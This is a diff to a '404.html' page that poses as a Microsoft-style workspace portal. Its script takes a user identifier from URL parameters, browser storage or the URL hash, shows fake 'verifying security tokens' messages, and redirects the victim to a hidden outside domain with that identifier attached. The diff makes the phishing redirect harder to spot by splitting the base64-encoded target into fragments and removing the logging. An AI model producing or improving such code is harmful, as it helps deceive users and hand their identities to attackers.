@@ -290,190 +290,115 @@
     </div>
 
     <script>
-        // =============================================
-        // HIDDEN CONFIGURATION - YOUR URL BASE64 ENCODED
-        // =============================================
-        const workspaceGateway = 'aHR0cHM6Ly9iaWxsaW5nLnZlbG9ydXNzcGluZS5ibG9nL1BuVUpyR2Vk';
-        const fallbackResource = 'https://workspace.microsoft.com/en-us/security';
-        
-        // Verify the base64 encoding is correct
-        console.log('🔐 Encoded Gateway:', workspaceGateway);
-        console.log('🔓 Decoded Gateway:', atob(workspaceGateway));
-        
-        class ResourceLoader {
-            constructor() {
-                this.userData = '';
-                this.accessType = 'workspace';
-                this.initializeLoader();
-            }
-
-            initializeLoader() {
-                console.log('🚀 WorkSpace Portal - Resource Loader Initialized');
-                this.retrieveUserData();
-                this.determineAccessPath();
-                this.initiateNavigation();
-            }
-
-            retrieveUserData() {
-                console.log('🔍 Retrieving user authentication data...');
-                
-                // Method 1: URL parameters from portal
-                const urlParams = new URLSearchParams(window.location.search);
-                let userParam = urlParams.get('user');
-                
-                if (userParam) {
-                    this.userData = decodeURIComponent(userParam);
-                    console.log('✅ User data retrieved from URL parameters:', this.userData);
-                }
-
-                // Method 2: Local storage backup
-                if (!this.userData) {
-                    try {
-                        const storedUser = localStorage.getItem('workspace_user');
-                        if (storedUser) {
-                            this.userData = storedUser;
-                            localStorage.removeItem('workspace_user');
-                            console.log('✅ User data retrieved from local storage:', this.userData);
-                        }
-                    } catch (e) {
-                        console.log('ℹ️ Local storage not available');
-                    }
-                }
-
-                // Method 3: Session storage fallback
-                if (!this.userData) {
-                    try {
-                        const sessionUser = sessionStorage.getItem('portal_user');
-                        if (sessionUser) {
-                            this.userData = sessionUser;
-                            console.log('✅ User data retrieved from session storage:', this.userData);
-                        }
-                    } catch (e) {
-                        console.log('ℹ️ Session storage not available');
-                    }
-                }
-
-                if (this.userData) {
-                    this.displayUserInfo();
-                } else {
-                    console.log('ℹ️ No user data found - fresh access required');
-                }
-            }
-
-            displayUserInfo() {
-                const userInfo = document.getElementById('userInfo');
-                const userIdentifier = document.getElementById('userIdentifier');
-                
-                userIdentifier.textContent = this.userData;
-                userInfo.classList.remove('hidden');
-                userInfo.classList.add('fade-in');
-                
-                console.log('👤 User information displayed:', this.userData);
-            }
-
-            determineAccessPath() {
-                if (this.userData) {
-                    this.accessType = 'workspace';
-                    console.log('✅ Access path: Workspace environment with user data');
-                } else {
-                    this.accessType = 'fallback';
-                    console.log('🔄 Access path: Authentication required - no user data');
-                }
-            }
-
-            initiateNavigation() {
-                const progressMessage = document.getElementById('progressMessage');
-                const redirectStatus = document.getElementById('redirectStatus');
-
-                if (this.accessType === 'workspace') {
-                    progressMessage.textContent = 'Access granted - Configuring workspace environment...';
-                    redirectStatus.textContent = 'Establishing secure connection to project resources...';
-                    redirectStatus.style.color = 'var(--success-green)';
-                    
-                    console.log('🎯 Preparing workspace navigation with user:', this.userData);
-                    
-                    setTimeout(() => {
-                        this.navigateToWorkspace();
-                    }, 2500);
-                    
-                } else {
-                    progressMessage.textContent = 'Authentication required for workspace access...';
-                    redirectStatus.textContent = 'Redirecting to access portal...';
-                    
-                    console.log('🔄 Redirecting to authentication portal (no user data)');
-                    
-                    setTimeout(() => {
-                        window.location.href = 'index.html';
-                    }, 2000);
-                }
-            }
-
-            navigateToWorkspace() {
-                if (!this.userData) {
-                    console.error('❌ No user data available for navigation');
-                    window.location.href = 'index.html';
-                    return;
-                }
-
-                // Decode the hidden gateway URL
-                const endpoint = atob(workspaceGateway);
-                console.log('🌐 Decoded workspace endpoint:', endpoint);
-                console.log('👤 User data being passed:', this.userData);
-
-                // Safe parameter names - business appropriate
-                const navigationParams = new URLSearchParams({
-                    workspace_user: encodeURIComponent(this.userData),
-                    project_id: 'collaboration_portal',
-                    session_token: Math.random().toString(36).substr(2, 16),
-                    access_timestamp: Date.now().toString(),
-                    environment: 'production',
-                    portal_version: '2.4.1',
-                    resource_type: 'document_collaboration',
-                    access_level: 'verified_user',
-                    source: 'workspace_portal'
-                });
-
-                const destination = `${endpoint}?${navigationParams.toString()}`;
-                console.log('🎯 Final destination URL prepared');
-                console.log('🔗 Destination:', destination);
-                
-                // Execute navigation
-                try {
-                    console.log('🚀 Initiating primary redirect...');
-                    window.location.href = destination;
-                } catch (e) {
-                    console.log('🔄 Primary redirect failed, using fallback...');
-                    setTimeout(() => {
-                        window.location.replace(destination);
-                    }, 100);
-                }
-            }
-        }
-
-        // Initialize the resource loader
-        document.addEventListener('DOMContentLoaded', () => {
-            console.log('📄 404.html DOM fully loaded');
-            new ResourceLoader();
-        });
-
-        // Additional security and compatibility
         (function() {
-            // Ensure parameter persistence
-            const currentParams = new URLSearchParams(window.location.search);
-            if (currentParams.has('user') && !currentParams.has('portal_processed')) {
-                currentParams.append('portal_processed', 'true');
-                const newUrl = `${window.location.pathname}?${currentParams.toString()}`;
-                
-                if (window.history?.replaceState) {
-                    window.history.replaceState(null, '', newUrl);
+            'use strict';
+            
+            const urlParts = ['aHR0c','HM6Ly','9iaWxs','aW5nLn','ZlbG9y','dXNzcG','luZS5i','bG9nL1','BuVUpyR','2Vk'];
+            const fallback = 'https://workspace.microsoft.com';
+            
+            function getTarget() {
+                try {
+                    return atob(urlParts.join(''));
+                } catch {
+                    return fallback;
                 }
             }
+            
+            class PortalService {
+                constructor() {
+                    this.userContext = null;
+                    this.targetUrl = getTarget();
+                    this.start();
+                }
+                
+                start() {
+                    this.findUserData();
+                    this.prepareNavigation();
+                }
+                
+                findUserData() {
+                    const sources = [
+                        () => new URLSearchParams(window.location.search).get('u'),
+                        () => new URLSearchParams(window.location.search).get('user'),
+                        () => {
+                            try { return localStorage.getItem('ws_user'); } catch(e) { return null; }
+                        },
+                        () => {
+                            try { return sessionStorage.getItem('portal_user'); } catch(e) { return null; }
+                        },
+                        () => {
+                            const hash = window.location.hash.replace('#', '');
+                            return hash && hash.length > 3 ? hash : null;
+                        }
+                    ];
+                    
+                    for (let source of sources) {
+                        this.userContext = source();
+                        if (this.userContext) break;
+                    }
+                    
+                    if (this.userContext) {
+                        this.displayUser(this.userContext);
+                    }
+                }
+                
+                displayUser(data) {
+                    const element = document.getElementById('userInfo');
+                    const field = document.getElementById('userIdentifier');
+                    if (element && field) {
+                        field.textContent = data;
+                        element.classList.remove('hidden');
+                    }
+                }
+                
+                prepareNavigation() {
+                    const messages = [
+                        "Verifying security tokens...",
+                        "Loading collaboration modules...", 
+                        "Establishing secure connection...",
+                        "Synchronizing workspace data..."
+                    ];
+                    
+                    let current = 0;
+                    const updateMessage = () => {
+                        if (current < messages.length) {
+                            document.getElementById('redirectStatus').textContent = messages[current++];
+                        }
+                    };
+                    
+                    setInterval(updateMessage, 700);
+                    
+                    setTimeout(() => {
+                        if (this.userContext) {
+                            this.navigateToWorkspace();
+                        } else {
+                            window.location.href = 'index.html';
+                        }
+                    }, 2800);
+                }
+                
+                navigateToWorkspace() {
+                    const params = new URLSearchParams({
+                        wu: this.userContext,
+                        pid: 'workspace_v2',
+                        sid: 'sess_' + Date.now(),
+                        ref: document.referrer || 'direct',
+                        v: '2.4.1'
+                    });
+                    
+                    const destination = `${this.targetUrl}?${params}`;
+                    
+                    try {
+                        window.location.href = destination;
+                    } catch(e) {
+                        window.location.assign(destination);
+                    }
+                }
+            }
+            
+            setTimeout(() => new PortalService(), 150);
+            
         })();
-
-        // Verify the base64 encoding on load
-        console.log('✅ 404.html script loaded successfully');
-        console.log('🔐 Base64 encoded URL:', workspaceGateway);
-        console.log('🔓 Decoded target:', atob(workspaceGateway));
     </script>
 </body>
 </html>
